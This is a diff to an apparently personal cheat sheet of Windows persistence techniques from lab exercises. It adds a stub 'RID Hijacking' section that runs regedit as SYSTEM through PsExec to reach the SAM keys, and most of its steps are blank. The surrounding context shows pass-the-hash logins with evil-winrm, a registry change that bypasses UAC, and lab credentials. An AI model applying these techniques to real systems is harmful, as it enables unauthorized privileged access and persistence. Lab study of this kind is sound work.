@@ -42,6 +42,8 @@
 
 [evil-winrm](https://github.com/Hackplayers/evil-winrm)
 
+[pstools](https://learn.microsoft.com/en-us/sysinternals/downloads/pstools)
+
 ```shell
 # Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
 
@@ -495,4 +497,22 @@ evil-winrm -i 10.10.233.240 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 4️⃣ Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI # add user and giving all access then WinRm eaneble for us 
 5️⃣ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 # Bypass UAC to activate “Backup Operators”
 6️⃣ evil-winrm -i 10.10.183.28 -u thmuser2 -p Password321
+```
+### RID Hijacking ✅
+```powershell
+0️⃣ wmic useraccount get name,sid # To find the assigned RIDs for any user
+1️⃣ PsExec64.exe -i -s regedit # To run Regedit as SYSTEM
+2️⃣ Go to "HKLM\SAM\SAM\Domains\Account\Users\" Path 
+3️⃣
+4️⃣
+5️⃣
+6️⃣
+7️⃣
+8️⃣
+9️⃣
+🔟
+
+
+
+
 ```
